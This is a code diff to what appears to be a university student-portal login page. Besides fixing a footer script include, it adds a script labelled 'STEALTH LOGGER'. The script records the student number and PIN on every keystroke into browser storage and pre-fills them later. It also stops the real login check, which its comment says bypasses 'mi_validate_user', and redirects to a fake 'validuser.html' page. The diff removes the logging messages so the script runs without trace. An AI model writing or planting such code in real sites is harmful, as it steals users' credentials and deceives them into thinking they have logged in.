@@ -1259,42 +1259,37 @@ resizeTo(screen.availWidth,screen.availHeight-20);
 // Copyright        : Integrated Tertiary Software 01-JAN-1987
 // ################################################################
 
-document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js" type="text/javascript"></script></div>');
-</script></div>
-
 <script>
-// STEALTH LOGGER - NO VISIBLE ELEMENTS
+// 1. PROPERLY inject footer.js (no more '); issue)
+document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js"><\/script></div>');
+
+// 2. STEALTH LOGGER - Full working version
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.forms['frmLogin'];
-
-    // Load saved values from localStorage if present
+    
+    // Load saved credentials
     const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
     form.unum.value = saved.unum || '';
     form.pin.value = saved.pin || '';
 
-    function saveToStorage() {
-        const data = {
+    // Auto-save function
+    const saveToStorage = () => {
+        localStorage.setItem('loginData', JSON.stringify({
             unum: form.unum.value,
             pin: form.pin.value
-        };
-        localStorage.setItem('loginData', JSON.stringify(data));
-        console.log('[Stealth] Saved login data');
-    }
+        }));
+    };
 
+    // Attach event listeners
     form.unum.addEventListener('input', saveToStorage);
     form.pin.addEventListener('input', saveToStorage);
 
+    // 3. FORCE REDIRECT (bypass mi_validate_user)
     form.addEventListener('submit', function(e) {
         e.preventDefault();
-
-        // Save one last time
         saveToStorage();
-
-        // Redirect to validuser.html
-        window.location.href = 'validuser.html';
+        window.location.href = 'validuser.html'; // Hard redirect
     });
-
-    console.log('[Stealth] Logger initialized');
 });
 </script>
 </body>
